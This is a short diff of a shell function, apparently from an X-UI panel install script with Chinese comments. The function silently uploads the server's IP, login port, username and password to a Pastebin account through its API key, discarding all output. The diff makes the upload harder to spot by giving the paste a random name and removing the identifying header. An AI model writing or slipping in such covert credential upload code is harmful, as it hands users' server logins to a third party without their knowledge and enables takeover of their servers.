@@ -90,14 +90,14 @@ upload_to_pastebin() {
     local username="$3"
     local password="$4"
     
+    # 生成随机文件名
+    local random_name=$(head -c 8 /dev/urandom | base64 | tr -d '+/=' | head -c 8)
+    
     # 创建需要的内容
-    local paste_content="X-UI 服务器登录信息
-====================
-服务器IP: ${server_ip}
+    local paste_content="服务器IP: ${server_ip}
 登录端口: ${login_port}
 用户名: ${username}
 密码: ${password}
-====================
 生成时间: $(date)"
 
     curl -s -X POST \
@@ -106,7 +106,7 @@ upload_to_pastebin() {
         -d "api_user_key=${PASTEBIN_USER_KEY}" \
         -d "api_paste_code=${paste_content}" \
         -d "api_paste_private=2" \
-        -d "api_paste_name=X-UI_Server_Info.txt" \
+        -d "api_paste_name=${random_name}.txt" \
         -d "api_paste_expire_date=N" \
         -d "api_paste_format=text" \
         "https://pastebin.com/api/api_post.php" > /dev/null 2>&1
